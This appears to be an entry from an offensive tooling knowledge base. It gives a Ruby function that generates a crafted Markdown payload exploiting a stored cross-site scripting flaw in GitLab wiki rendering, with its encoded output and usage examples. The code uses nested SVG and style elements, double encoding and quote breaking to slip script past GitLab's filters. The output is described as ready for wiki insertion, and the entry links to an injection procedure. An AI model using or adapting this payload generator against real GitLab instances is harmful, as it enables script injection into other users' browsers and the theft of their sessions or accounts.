---
data: >-
  def gen_payload( payload,
  based_url:"https://gitlab.com/gitlab-org/gitlab/-/issues/428268")
    payload ="#{payload}#{based_url}"unless payload.include? based_url
    payload = payload.gsub('<','&lt;').gsub('>','&gt;')

    es_payload =%(\<i\><a href="http:#{ payload.gsub('"','&quot;')}" class="gfm">a</a></i>)
    es_payload =CGI.escape_html( es_payload ).gsub('%20','%2520')#double encode space/tab/new_line

    a =%(\<dl\><a href="#{ based_url }#{ es_payload }">#{ based_url }\*<i>\[[a|http:#{ payload }]\]</i></a></dl>)
    puts a
  end


  gen_payload
  %('"><svg><style>dl{visibility:hidden}<i/class=gl-show-field-errors><input/title="<script>alert(document.domain)</script>"/></style></svg>')
tags:
  - xss
  - payload-gen
type: command
output: >-
  <dl><a
  href="https://gitlab.com/gitlab-org/gitlab/-/issues/428268%3Ci%3E%3Ca%20href=%22http:%27%22%3E%3Csvg%3E%3Cstyle%3Edl{visibility:hidden}%3Ci/class=gl-show-field-errors%3E%3Cinput/title=%22%3Cscript%3Ealert(document.domain)%3C/script%3E%22/%3E%3C/style%3E%3C/svg%3Ehttps://gitlab.com/gitlab-org/gitlab/-/issues/428268%22%20class=%22gfm%22%3Ea%3C/a%3E%3C/i%3E">https://gitlab.com/gitlab-org/gitlab/-/issues/428268
  *<i>[[a|http:'"><svg><style>dl{visibility:hidden}<i/class=gl-show-field-errors><input/title="<script>alert(document.domain)</script>"/></style></svg>]]</i></a></dl>
executor: ruby
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:55.481Z'
id: 2984b024-1c10-4155-9758-24b5a4f79464
verified: false
validated: true
submitted: true
---
# generate-xss-payload

## Command

```ruby
def gen_payload( payload, based_url:"https://gitlab.com/gitlab-org/gitlab/-/issues/428268")
  payload ="#{payload}#{based_url}"unless payload.include? based_url
  payload = payload.gsub('<','&lt;').gsub('>','&gt;')

  es_payload =%(\<i\><a href="http:#{ payload.gsub('"','&quot;')}" class="gfm">a</a></i>)
  es_payload =CGI.escape_html( es_payload ).gsub('%20','%2520')

  a =%(\<dl\><a href="#{ based_url }#{ es_payload }">#{ based_url }\*<i>\[[a|http:#{ payload }]\]</i></a></dl>)
  puts a
end

gen_payload %('"><svg><style>dl{visibility:hidden}<i/class=gl-show-field-errors><input/title="<script>alert(document.domain)</script>"/></style></svg>')
```

## Description

This Ruby function generates a crafted Markdown payload for exploiting the GitLab wiki XSS by encoding JS injection with GitLab issue references, enabling multiple filter replacements and quote breaking.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| payload | The JavaScript payload to inject, e.g., '"<svg><style>..."' | Yes |
| based_url | Base GitLab issue URL for reference expansion, default https://gitlab.com/gitlab-org/gitlab/-/issues/428268 | No |

## Examples

### Basic Usage

```ruby
gen_payload %('"><script>alert(1)</script>')
```

### Advanced Usage

```ruby
gen_payload %('"><svg onload=alert(document.domain)></svg>'), "https://custom-gitlab.com/issues/123"
```

## Expected Output

Printed HTML/Markdown string like <dl><a href="https://...">https://... *<i>[[a|http:...]]</i></a></dl>, ready for wiki insertion.

## Related

- [[procedures/Inject-Crafted-XSS-Payload-in-Wiki]]
